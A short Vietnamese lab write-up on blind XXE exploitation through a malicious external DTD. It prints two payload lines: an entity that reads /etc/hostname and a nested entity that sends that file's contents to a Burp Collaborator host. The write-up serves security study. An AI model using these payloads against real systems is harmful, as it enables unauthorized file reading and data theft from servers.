## Khai thác XXE mù để lấy cắp dữ liệu bằng DTD bên ngoài độc hại 
* Ở các bài lab trước nó tôi chỉ dừng lại ở việc Ping để biết server có lỗ hổng. Nhưng bài này yêu cầu tôi phải lấy được nội dung file /etc/hostname/
* Vấn đề khó ở đây là server sẽ không hiển thị kết quả ra màn hình (Blind). Server có thể chặn các payload phức tạp nằm trực tiếp trong gói tin XML.
* Vì thế tôi phải tạo 1 file cấu hình XML trên máy khai thác và phải gọi(tải) về bằng 1 cách nào đó, để server ít cảnh giác hơn.
* <img width="890" height="608" alt="image" src="https://github.com/user-attachments/assets/10dc9c62-6fb0-4af6-8131-abb13da76824" />
* Tôi đã thêm payload như trong ảnh vào exploit server giải thích về payload này thì
* `<!ENTITY % file SYSTEM "file:///etc/hostname">` dòng đầu tiên là dòng để lấy dữ liệu. Tạo 1 biến tên là `%file`. Giá trị của nó chính là nội dung tệp `/etc/hostname`
* `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR-ID.oastify.com/?x=%file;'>">` Dòng 2 là tạo chuyển phát
* **Ý nghĩa** Đây là 1 "mẹo" kỹ thuật. Chúng tạo ra 1 biến %eval, bên trong nó lại định nghĩa ra 1 biến khác tên là `%exfil`.
* Biến `%exfil` này có nhiệm vụ gọi đến link `Burp Collaborator` của bạn và đính kèm nội dung biến `%file` vào sau dấu `?x=`.
